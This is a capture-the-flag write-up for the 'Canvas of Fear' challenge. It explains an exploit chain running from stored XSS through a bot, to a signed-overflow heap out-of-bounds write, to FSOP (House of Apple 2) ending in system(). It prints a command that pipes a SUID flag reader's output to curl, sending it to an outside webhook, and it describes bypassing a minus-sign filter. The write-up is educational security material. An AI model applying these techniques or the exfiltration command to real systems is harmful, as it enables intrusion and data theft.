# Canvas of Fear - Writeup

**CTF**: Midnight Flag 2026
**Category**: PWN
**Author**: fun88337766
**Flag**: `MCTF{Wh3n_Fe4r_3sc4p3_Th3_C4NV4S}`

## TL;DR

XSS in admin messages panel → Puppeteer bot executes JS from localhost → admin API access → heap OOB write via signed integer overflow in canvas pixel SET → heap/libc/binary base leaks → FSOP (House of Apple 2) via `_IO_list_all` fake FILE → `system("/app/read_flag|curl -sd@- WEBHOOK")` → flag exfiltrated via HTTP POST.

## Architecture

The challenge is a hybrid web+pwn service:

- **Flask server** (`server.py`, port 5080): wraps a native binary, exposes REST API
- **`canvas_manager`** (ELF64 PIE, Full RELRO, glibc 2.34): manages pixel canvases via stdin/stdout commands (CREATE, SET, GET, DELETE, GETALL, EXIT)
- **Puppeteer bot** (`bot.js`): visits `/admin/messages` every 30s, waits 10s
- **`/app/read_flag`**: SUID root binary that reads `/flag.txt` (chmod 400 root)

Admin endpoints (`/api/canvas/*`) are restricted to `127.0.0.1`. The public endpoint `/api/message` (POST) stores messages rendered with Jinja2 `| safe` filter — **stored XSS**.

## Vulnerability Analysis

### 1. Stored XSS (CWE-79)

`admin_messages.html` renders user-controlled `content` and `author` with `| safe`:
```html
<div class="content">{{ (msg.content or '') | safe }}</div>
```

Any user can POST to `/api/message`. The bot visits `/admin/messages` from localhost, executing injected `<script>` tags with full access to admin APIs.

### 2. Signed Integer Overflow → OOB Write (CWE-787)

The `cmd_set` function checks pixel bounds with a **signed comparison** (`jge`):
```asm
lea  eax, [rdx+rsi*1]    ; eax = y*width + x (signed)
cmp  eax, edi             ; compare with width*height
jge  ERROR                ; signed >= check
```

Negative indices bypass this check (`-27 >= 1` is false). The server.py filters `-` in command strings, but `sscanf("%d")` with values > INT_MAX wraps: `4294967269` → `-27` as int32. The string `"4294967269"` contains no `-`, passing the filter.

### 3. Full RELRO + glibc 2.34

GOT is read-only. No `__free_hook`/`__malloc_hook`. Code execution requires FSOP.

## Exploit Chain

### Phase 1: Heap Layout & Leaks

After creating canvases 1 and 2 (1x1 each), the heap layout is deterministic:
```
heap+0x16c0: struct1 (id=1, w=1, h=1, pixels_ptr=heap+0x16e0)
heap+0x16e0: pixels1 (3 bytes)
heap+0x1700: struct2 (id=2, w=1, h=1, pixels_ptr=heap+0x1720)
heap+0x1720: pixels2 (3 bytes)
```

**Heap leak**: Inflate `struct1.height` via OOB write from canvas2 (index -30/-29 from pixels2 overwrites struct1.height). Then GET canvas1 reads beyond pixels1 into struct2, leaking `struct2.pixels_ptr` → heap base.

**Libc leak**: Create canvas3 (19x19, pixels chunk = 0x450 > tcache max 0x410), create canvas4 (guard), delete canvas3. The freed pixels3 chunk lands in the unsorted bin with `fd = &main_arena.bins[0]` (libc address). Read via arbitrary read primitive.

**Binary base**: Read `_r_debug` from ld-linux (at `libc_base + 0x1ff000 + 0x32100`), follow `r_map` → `link_map[0].l_addr` = binary load address.

### Phase 2: Arbitrary Read/Write Primitives

**OOB write from canvas2** overwrites struct1 metadata:
- `set_height(h)`: 2 SET ops at indices -30/-29 (pixels2 → struct1.height, distance 0x58)
- `set_pixels_ptr(addr)`: 3 SET ops at indices -27/-26/-25 (pixels2 → struct1.pixels_ptr, distance 0x50)

**Arbitrary read**: `set_pixels_ptr(target) + GET canvas1` reads from target address.

**Arbitrary write**: `set_pixels_ptr(target) + SET canvas1` writes 3 bytes at target.

### Phase 3: FSOP (House of Apple 2)

Create canvas5 (50x50) for heap space. Build three fake structures in its pixel buffer:

**Fake FILE** (at pix5+0x000):
- `_flags` (offset 0x00): `"    /app/read_flag|curl -sd@- WEBHOOK\0"` (leading spaces clear `_IO_NO_WRITES` bit)
- `_IO_write_ptr` (0x28): naturally non-zero from command string bytes
- `_chain` (0x68): old `_IO_list_all` head (links to real stdout)
- `_lock` (0x88): pointer to zeros in our buffer
- `_wide_data` (0xa0): → fake wide_data
- `_mode` (0xc0): 1 (enters wide code path)
- `vtable` (0xd8): `_IO_wfile_jumps` (passes vtable range check)

**Fake _IO_wide_data** (at pix5+0x200):
- `_IO_write_ptr` (0x20): 1 (triggers `_IO_WOVERFLOW` in `_IO_flush_all`)
- `_wide_vtable` (0xe0): → fake wide vtable

**Fake wide vtable** (at pix5+0x300):
- `__doallocate` (0x68): `system@libc`

Overwrite `_IO_list_all` → fake FILE.

### Phase 4: Trigger & Flag Exfiltration

Inject EXIT into the binary via CREATE API with `canvas_id = "99\nEXIT"`. The binary processes CREATE, then EXIT in sequence. On `exit()`:

```
exit() → _IO_flush_all → iterates _IO_list_all → finds fake FILE
→ _IO_WOVERFLOW(fp, WEOF) → _IO_wfile_overflow
  → checks _flags & _IO_NO_WRITES = 0 (spaces) ✓
  → _IO_wdoallocbuf(fp)
    → _wide_vtable->__doallocate(fp) = system(fp)
    → system("    /app/read_flag|curl -sd@- WEBHOOK")
```

`/app/read_flag` (SUID root) reads `/flag.txt`, pipes output to `curl` which POSTs it to our webhook.

## Key Challenges

- **`-` filter bypass**: unsigned integers > INT_MAX parsed by `sscanf("%d")` wrap to negative values
- **Full RELRO**: GOT is read-only → must use FSOP instead of GOT overwrite
- **glibc 2.34**: no `__free_hook` → House of Apple 2 via `_IO_wfile_jumps` + `__doallocate`
- **Output capture**: binary dies during `exit()` → pwntools won't read stale pipe data → exfiltrate flag directly via `curl` inside `system()`
- **10s bot timeout**: ~74 API calls must complete within the Puppeteer page visit window
- **3-byte write granularity**: SET writes RGB (3 bytes) per pixel → must align struct field writes to pixel boundaries

## Files

- `solve.py`: local binary exploit (pwntools, verified FSOP chain)
- `xss_payload_final.js`: XSS payload for remote exploitation
- `send_xss.py`: sends XSS to target via `/api/message`

## References

- House of Apple 2: [https://bbs.kanxue.com/thread-273832.htm](https://bbs.kanxue.com/thread-273832.htm)
- glibc 2.34 FSOP techniques
- `_IO_wfile_jumps` vtable abuse for `__doallocate` → `system()`
